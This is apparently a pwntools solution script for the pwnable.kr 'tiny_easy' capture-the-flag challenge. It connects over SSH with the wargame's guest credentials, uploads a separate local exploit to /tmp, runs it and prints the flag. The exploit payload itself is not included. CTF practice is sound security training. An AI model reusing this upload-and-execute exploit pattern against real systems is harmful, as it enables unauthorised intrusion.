#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template --host pwnable.kr --port 2222 --pass guest --user tiny_easy ./tiny_easy
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(b'./tiny_easy')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwnable.kr'
port = int(args.PORT or 2222)
user = args.USER or 'tiny_easy'
password = args.PASSWORD or 'guest'
remote_path = 'tiny_easy'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug(argv, exe=exe.path, gdbscript=gdbscript, *a, **kw)
    else:
        return process(argv, executable=exe.path, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug(argv, exe=remote_path, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.process(argv, executable=remote_path, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)

REMOTE_EXPLOIT_PATH = "/tmp/local_exploit.py"

shell.upload_file("local_exploit.py", REMOTE_EXPLOIT_PATH)
shell.chmod("+x", REMOTE_EXPLOIT_PATH)

io = shell.run(REMOTE_EXPLOIT_PATH, env={"PWNLIB_NOTERM": "1"})

log.info("running local exploit...")

io.recvuntil(b"exploit succeeded!\n")

log.success(f"flag = '{term.text.bold_italic_yellow(io.recvline().decode().strip())}'")
